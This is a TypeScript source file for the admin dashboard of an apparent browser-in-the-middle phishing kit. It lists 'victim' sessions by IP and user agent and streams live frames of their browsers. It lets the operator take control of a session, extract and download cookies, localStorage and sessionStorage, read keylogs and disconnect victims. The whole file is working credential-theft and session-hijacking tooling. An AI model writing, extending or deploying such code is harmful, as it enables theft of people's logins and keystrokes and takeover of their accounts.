import { io, Socket } from 'socket.io-client';

interface Session {
  id: string;
  victimSocketId: string;
  victimIp: string;
  userAgent: string;
  viewport: { width: number; height: number };
  browserId: string | null;
  targetUrl?: string;
  status: 'active' | 'admin-controlled' | 'terminated';
  adminSocketId?: string;
  createdAt: string;
  lastActivity: string;
}

interface Credentials {
  cookies: any[];
  localStorage: Record<string, string>;
  sessionStorage: Record<string, string>;
  url: string;
  extractedAt: string;
}

export class AdminClient {
  private socket: Socket | null = null;
  private authenticated = false;
  private sessions: Map<string, Session> = new Map();
  private currentSessionId: string | null = null;
  private streamInterval: NodeJS.Timeout | null = null;
  private currentCredentials: Credentials | null = null;
  private uptimeStart: number = Date.now();

  // DOM Elements
  private loginScreen!: HTMLElement;
  private dashboard!: HTMLElement;
  private loginForm!: HTMLFormElement;
  private authKeyInput!: HTMLInputElement;
  private loginError!: HTMLElement;
  private sessionsContainer!: HTMLElement;
  private noSessions!: HTMLElement;
  private sessionModal!: HTMLElement;
  private credentialsModal!: HTMLElement;
  private keylogModal!: HTMLElement;
  private streamFullscreenModal!: HTMLElement;

  initialize(): void {
    this.bindElements();
    this.bindEvents();
    this.connectSocket();
    this.startUptimeCounter();
  }

  private bindElements(): void {
    this.loginScreen = document.getElementById('login-screen')!;
    this.dashboard = document.getElementById('dashboard')!;
    this.loginForm = document.getElementById('login-form') as HTMLFormElement;
    this.authKeyInput = document.getElementById('auth-key') as HTMLInputElement;
    this.loginError = document.getElementById('login-error')!;
    this.sessionsContainer = document.getElementById('sessions-container')!;
    this.noSessions = document.getElementById('no-sessions')!;
    this.sessionModal = document.getElementById('session-modal')!;
    this.credentialsModal = document.getElementById('credentials-modal')!;
    this.keylogModal = document.getElementById('keylog-modal')!;
    this.streamFullscreenModal = document.getElementById('stream-fullscreen-modal')!;
  }

  private bindEvents(): void {
    // Login form
    this.loginForm.addEventListener('submit', (e) => {
      e.preventDefault();
      this.authenticate();
    });

    // Header buttons
    document.getElementById('btn-refresh')!.addEventListener('click', () => this.refreshSessions());
    document.getElementById('btn-logout')!.addEventListener('click', () => this.logout());

    // View toggle
    document.querySelectorAll('.toggle-btn').forEach((btn) => {
      btn.addEventListener('click', (e) => {
        const target = e.currentTarget as HTMLElement;
        const view = target.dataset.view;
        this.setView(view as 'grid' | 'list');
      });
    });

    // Session modal
    document.getElementById('modal-close')!.addEventListener('click', () => this.closeSessionModal());
    document.getElementById('btn-takeover')!.addEventListener('click', () => this.takeoverSession());
    document.getElementById('btn-release')!.addEventListener('click', () => this.releaseSession());
    document.getElementById('btn-extract')!.addEventListener('click', () => this.extractCredentials());
    document.getElementById('btn-keylog')!.addEventListener('click', () => this.getKeylogs());
    document.getElementById('btn-boot')!.addEventListener('click', () => this.bootSession());
    document.getElementById('btn-fullscreen-stream')!.addEventListener('click', () => this.openFullscreenStream());
    document.getElementById('stream-overlay')!.addEventListener('click', () => this.startStream());

    // Credentials modal
    document.getElementById('credentials-close')!.addEventListener('click', () => this.closeCredentialsModal());
    document.getElementById('btn-copy-creds')!.addEventListener('click', () => this.copyCredentials());
    document.getElementById('btn-download-creds')!.addEventListener('click', () => this.downloadCredentials());
    document.querySelectorAll('.tabs .tab-btn').forEach((btn) => {
      btn.addEventListener('click', (e) => {
        const target = e.currentTarget as HTMLElement;
        this.switchCredentialsTab(target.dataset.tab!);
      });
    });

    // Keylog modal
    document.getElementById('keylog-close')!.addEventListener('click', () => this.closeKeylogModal());
    document.getElementById('btn-copy-keylog')!.addEventListener('click', () => this.copyKeylogs());
    document.getElementById('btn-refresh-keylog')!.addEventListener('click', () => this.getKeylogs());

    // Stream fullscreen modal
    document.getElementById('stream-fullscreen-close')!.addEventListener('click', () => this.closeFullscreenStream());

    // Modal backdrop clicks
    document.querySelectorAll('.modal-backdrop').forEach((backdrop) => {
      backdrop.addEventListener('click', () => this.closeAllModals());
    });
  }

  private connectSocket(): void {
    const serverUrl = window.location.origin;
    this.socket = io(`${serverUrl}/admin`, {
      transports: ['websocket', 'polling'],
    });

    this.socket.on('connect', () => {
      console.log('[Admin] Connected to server');
      this.updateConnectionStatus(true);
    });

    this.socket.on('disconnect', () => {
      console.log('[Admin] Disconnected from server');
      this.updateConnectionStatus(false);
      if (this.authenticated) {
        // Try to reconnect
        setTimeout(() => this.socket?.connect(), 2000);
      }
    });

    this.socket.on('auth:success', () => {
      console.log('[Admin] Authenticated successfully');
      this.authenticated = true;
      this.showDashboard();
    });

    this.socket.on('auth:failed', (data: { message: string }) => {
      console.log('[Admin] Authentication failed:', data.message);
      this.showLoginError(data.message);
    });

    this.socket.on('error', (data: { message: string }) => {
      console.error('[Admin] Error:', data.message);
      alert(`Error: ${data.message}`);
    });

    this.socket.on('sessions:list', (sessions: Session[]) => {
      console.log('[Admin] Received sessions:', sessions.length);
      this.updateSessions(sessions);
    });

    this.socket.on('session:takeover:success', (data: { sessionId: string }) => {
      console.log('[Admin] Takeover success:', data.sessionId);
      this.updateSessionStatus(data.sessionId, 'admin-controlled');
    });

    this.socket.on('session:release:success', (data: { sessionId: string }) => {
      console.log('[Admin] Release success:', data.sessionId);
      this.updateSessionStatus(data.sessionId, 'active');
    });

    this.socket.on('session:boot:success', (data: { sessionId: string }) => {
      console.log('[Admin] Boot success:', data.sessionId);
      this.sessions.delete(data.sessionId);
      this.renderSessions();
      this.closeSessionModal();
    });

    this.socket.on('credentials:result', (data: { browserId: string; credentials: Credentials }) => {
      console.log('[Admin] Credentials received');
      this.currentCredentials = data.credentials;
      this.showCredentialsModal();
    });

    this.socket.on('keylog:result', (data: { sessionId: string; keylog: string }) => {
      console.log('[Admin] Keylogs received');
      this.showKeylogModal(data.keylog);
    });

    // Thumbnail updates
    this.socket.on('session:thumbnail', (data: { sessionId: string; thumbnail: string }) => {
      this.updateThumbnail(data.sessionId, data.thumbnail);
    });

    // Frame updates for active stream
    this.socket.on('frame', (data: { browserId: string; frame: string }) => {
      this.updateStreamFrame(data.frame);
    });
  }

  private authenticate(): void {
    const key = this.authKeyInput.value.trim();
    if (!key) {
      this.showLoginError('Please enter an authentication key');
      return;
    }

    this.hideLoginError();
    this.socket?.emit('auth', { key });
  }

  private showLoginError(message: string): void {
    this.loginError.textContent = message;
    this.loginError.classList.remove('hidden');
  }

  private hideLoginError(): void {
    this.loginError.classList.add('hidden');
  }

  private showDashboard(): void {
    this.loginScreen.classList.add('hidden');
    this.dashboard.classList.remove('hidden');
    this.refreshSessions();
  }

  private logout(): void {
    this.authenticated = false;
    this.socket?.disconnect();
    this.dashboard.classList.add('hidden');
    this.loginScreen.classList.remove('hidden');
    this.authKeyInput.value = '';
    this.sessions.clear();
    setTimeout(() => {
      this.socket?.connect();
    }, 500);
  }

  private updateConnectionStatus(connected: boolean): void {
    const status = document.getElementById('connection-status')!;
    if (connected) {
      status.classList.remove('disconnected');
      status.innerHTML = '<span class="status-dot"></span><span>Connected</span>';
    } else {
      status.classList.add('disconnected');
      status.innerHTML = '<span class="status-dot"></span><span>Disconnected</span>';
    }
  }

  private refreshSessions(): void {
    this.socket?.emit('sessions:list');
  }

  private updateSessions(sessions: Session[]): void {
    this.sessions.clear();
    sessions.forEach((session) => {
      this.sessions.set(session.id, session);
    });
    this.renderSessions();
    this.updateStats();
  }

  private updateSessionStatus(sessionId: string, status: 'active' | 'admin-controlled'): void {
    const session = this.sessions.get(sessionId);
    if (session) {
      session.status = status;
      this.renderSessions();
      this.updateModalStatus(status);
    }
  }

  private renderSessions(): void {
    if (this.sessions.size === 0) {
      this.noSessions.classList.remove('hidden');
      return;
    }

    this.noSessions.classList.add('hidden');

    // Clear existing cards (but keep the no-sessions element)
    const cards = this.sessionsContainer.querySelectorAll('.session-card');
    cards.forEach((card) => card.remove());

    // Render session cards
    this.sessions.forEach((session) => {
      const card = this.createSessionCard(session);
      this.sessionsContainer.appendChild(card);
    });
  }

  private createSessionCard(session: Session): HTMLElement {
    const card = document.createElement('div');
    card.className = 'session-card' + (session.status === 'admin-controlled' ? ' admin-controlled' : '');
    card.dataset.sessionId = session.id;

    const duration = this.formatDuration(new Date(session.createdAt).getTime());
    const targetHost = session.targetUrl ? new URL(session.targetUrl).hostname : 'Unknown';

    card.innerHTML = `
      <div class="session-thumbnail">
        <div class="placeholder" id="thumb-${session.id}">◇</div>
        <div class="session-status-badge ${session.status === 'admin-controlled' ? 'admin' : ''}">
          <span class="dot"></span>
          <span>${session.status === 'admin-controlled' ? 'Controlled' : 'Active'}</span>
        </div>
      </div>
      <div class="session-details">
        <div class="session-target">${targetHost}</div>
        <div class="session-meta">
          <div class="session-meta-item">
            <span class="icon">◉</span>
            <span>${session.victimIp}</span>
          </div>
          <div class="session-meta-item">
            <span class="icon">⏱</span>
            <span>${duration}</span>
          </div>
        </div>
      </div>
    `;

    card.addEventListener('click', () => this.openSessionModal(session.id));

    return card;
  }

  private updateStats(): void {
    document.getElementById('stat-sessions')!.textContent = this.sessions.size.toString();
    
    // Count unique browsers
    const browsers = new Set<string>();
    this.sessions.forEach((session) => {
      if (session.browserId) browsers.add(session.browserId);
    });
    document.getElementById('stat-browsers')!.textContent = browsers.size.toString();
  }

  private startUptimeCounter(): void {
    setInterval(() => {
      const elapsed = Date.now() - this.uptimeStart;
      document.getElementById('stat-uptime')!.textContent = this.formatDuration(this.uptimeStart);
    }, 1000);
  }

  private formatDuration(startTime: number): string {
    const elapsed = Date.now() - startTime;
    const seconds = Math.floor(elapsed / 1000);
    const minutes = Math.floor(seconds / 60);
    const hours = Math.floor(minutes / 60);

    if (hours > 0) {
      return `${hours}h ${minutes % 60}m`;
    } else if (minutes > 0) {
      return `${minutes}m ${seconds % 60}s`;
    } else {
      return `${seconds}s`;
    }
  }

  private setView(view: 'grid' | 'list'): void {
    document.querySelectorAll('.toggle-btn').forEach((btn) => {
      btn.classList.toggle('active', (btn as HTMLElement).dataset.view === view);
    });
    
    this.sessionsContainer.className = view === 'grid' ? 'sessions-grid' : 'sessions-list';
  }

  // Session Modal
  private openSessionModal(sessionId: string): void {
    const session = this.sessions.get(sessionId);
    if (!session) return;

    this.currentSessionId = sessionId;

    // Populate modal
    document.getElementById('modal-session-id')!.textContent = session.id;
    document.getElementById('modal-ip')!.textContent = session.victimIp;
    document.getElementById('modal-ua')!.textContent = session.userAgent;
    document.getElementById('modal-url')!.textContent = session.targetUrl || 'Unknown';
    document.getElementById('modal-duration')!.textContent = this.formatDuration(new Date(session.createdAt).getTime());
    this.updateModalStatus(session.status);

    // Reset stream
    document.getElementById('stream-overlay')!.classList.remove('hidden');
    (document.getElementById('modal-stream') as HTMLImageElement).src = '';

    this.sessionModal.classList.remove('hidden');
  }

  private updateModalStatus(status: 'active' | 'admin-controlled' | 'terminated'): void {
    const statusEl = document.getElementById('modal-status')!;
    const takeoverBtn = document.getElementById('btn-takeover')!;
    const releaseBtn = document.getElementById('btn-release')!;

    statusEl.textContent = status.charAt(0).toUpperCase() + status.slice(1).replace('-', ' ');
    statusEl.style.color = status === 'admin-controlled' ? 'var(--warning)' : 'var(--success)';

    if (status === 'admin-controlled') {
      takeoverBtn.classList.add('hidden');
      releaseBtn.classList.remove('hidden');
    } else {
      takeoverBtn.classList.remove('hidden');
      releaseBtn.classList.add('hidden');
    }
  }

  private closeSessionModal(): void {
    this.sessionModal.classList.add('hidden');
    this.stopStream();
    this.currentSessionId = null;
  }

  private startStream(): void {
    if (!this.currentSessionId) return;

    const session = this.sessions.get(this.currentSessionId);
    if (!session?.browserId) return;

    document.getElementById('stream-overlay')!.classList.add('hidden');

    // Request stream frames
    this.socket?.emit('stream:start', { browserId: session.browserId });
  }

  private stopStream(): void {
    if (this.streamInterval) {
      clearInterval(this.streamInterval);
      this.streamInterval = null;
    }
    this.socket?.emit('stream:stop');
  }

  private updateStreamFrame(frame: string): void {
    const img = document.getElementById('modal-stream') as HTMLImageElement;
    const fullscreenImg = document.getElementById('fullscreen-stream') as HTMLImageElement;
    
    img.src = `data:image/jpeg;base64,${frame}`;
    if (!this.streamFullscreenModal.classList.contains('hidden')) {
      fullscreenImg.src = img.src;
    }
  }

  private updateThumbnail(sessionId: string, thumbnail: string): void {
    const thumbEl = document.getElementById(`thumb-${sessionId}`);
    if (thumbEl) {
      const img = document.createElement('img');
      img.src = `data:image/jpeg;base64,${thumbnail}`;
      thumbEl.replaceWith(img);
    }
  }

  private openFullscreenStream(): void {
    const modalImg = document.getElementById('modal-stream') as HTMLImageElement;
    const fullscreenImg = document.getElementById('fullscreen-stream') as HTMLImageElement;
    fullscreenImg.src = modalImg.src;
    this.streamFullscreenModal.classList.remove('hidden');
  }

  private closeFullscreenStream(): void {
    this.streamFullscreenModal.classList.add('hidden');
  }

  // Session Actions
  private takeoverSession(): void {
    if (!this.currentSessionId) return;

    const session = this.sessions.get(this.currentSessionId);
    if (!session?.browserId) return;

    this.socket?.emit('session:takeover', {
      browserId: session.browserId,
      viewport: { width: window.innerWidth, height: window.innerHeight },
    });
  }

  private releaseSession(): void {
    if (!this.currentSessionId) return;

    const session = this.sessions.get(this.currentSessionId);
    if (!session?.browserId) return;

    this.socket?.emit('session:release', { browserId: session.browserId });
  }

  private extractCredentials(): void {
    if (!this.currentSessionId) return;

    const session = this.sessions.get(this.currentSessionId);
    if (!session?.browserId) return;

    this.socket?.emit('credentials:extract', { browserId: session.browserId });
  }

  private getKeylogs(): void {
    if (!this.currentSessionId) return;
    this.socket?.emit('keylog:get', { sessionId: this.currentSessionId });
  }

  private bootSession(): void {
    if (!this.currentSessionId) return;

    const session = this.sessions.get(this.currentSessionId);
    if (!session?.browserId) return;

    if (confirm('Are you sure you want to boot this session? The victim will be disconnected.')) {
      this.socket?.emit('session:boot', { browserId: session.browserId });
    }
  }

  // Credentials Modal
  private showCredentialsModal(): void {
    if (!this.currentCredentials) return;
    this.switchCredentialsTab('cookies');
    this.credentialsModal.classList.remove('hidden');
  }

  private closeCredentialsModal(): void {
    this.credentialsModal.classList.add('hidden');
  }

  private switchCredentialsTab(tab: string): void {
    document.querySelectorAll('.tabs .tab-btn').forEach((btn) => {
      btn.classList.toggle('active', (btn as HTMLElement).dataset.tab === tab);
    });

    const content = document.getElementById('credentials-content')!;
    
    if (!this.currentCredentials) return;

    switch (tab) {
      case 'cookies':
        content.textContent = JSON.stringify(this.currentCredentials.cookies, null, 2);
        break;
      case 'localstorage':
        content.textContent = JSON.stringify(this.currentCredentials.localStorage, null, 2);
        break;
      case 'sessionstorage':
        content.textContent = JSON.stringify(this.currentCredentials.sessionStorage, null, 2);
        break;
    }
  }

  private copyCredentials(): void {
    if (!this.currentCredentials) return;
    navigator.clipboard.writeText(JSON.stringify(this.currentCredentials, null, 2));
    alert('Credentials copied to clipboard!');
  }

  private downloadCredentials(): void {
    if (!this.currentCredentials) return;

    const blob = new Blob([JSON.stringify(this.currentCredentials, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `credentials-${this.currentSessionId}-${Date.now()}.json`;
    a.click();
    URL.revokeObjectURL(url);
  }

  // Keylog Modal
  private showKeylogModal(keylog: string): void {
    document.getElementById('keylog-content')!.textContent = keylog || 'No keylogs recorded yet.';
    this.keylogModal.classList.remove('hidden');
  }

  private closeKeylogModal(): void {
    this.keylogModal.classList.add('hidden');
  }

  private copyKeylogs(): void {
    const content = document.getElementById('keylog-content')!.textContent || '';
    navigator.clipboard.writeText(content);
    alert('Keylogs copied to clipboard!');
  }

  private closeAllModals(): void {
    this.closeSessionModal();
    this.closeCredentialsModal();
    this.closeKeylogModal();
    this.closeFullscreenStream();
  }
}

